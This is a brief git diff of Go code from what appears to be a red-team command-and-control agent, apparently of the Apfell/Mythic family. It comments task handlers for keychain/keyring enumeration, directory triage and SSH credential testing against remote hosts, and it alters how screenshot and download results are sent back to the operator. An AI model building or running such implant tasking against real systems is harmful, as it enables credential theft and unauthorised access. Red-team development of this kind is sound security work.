@@ -181,12 +181,15 @@ func main() {
 				break
 
 			case 14:
+				// Enumerate keyring data for linux or the keychain for macos
 				go keys.Run(task, res)
 				break
 			case 15:
+				// Triage a directory and organize files by type
 				go triagedirectory.Run(task, res)
 				break
 			case 16:
+				// Test credentials against remote hosts
 				go sshauth.Run(task, res)
 				break
 			case 20:
@@ -197,7 +200,7 @@ func main() {
 			// Listen on the results channel for 1 second
 			select {
 			case toApfell := <-res:
-				if strings.Contains(toApfell.TaskItem.Command, "screencapture") || strings.Contains(toApfell.TaskItem.Command, "download") {
+				if strings.Contains(toApfell.TaskItem.Command, "screencapture") {
 					profile.SendFileChunks(toApfell.TaskItem, toApfell.TaskResult)
 				} else {
 					profile.PostResponse(toApfell.TaskItem, string(toApfell.TaskResult))
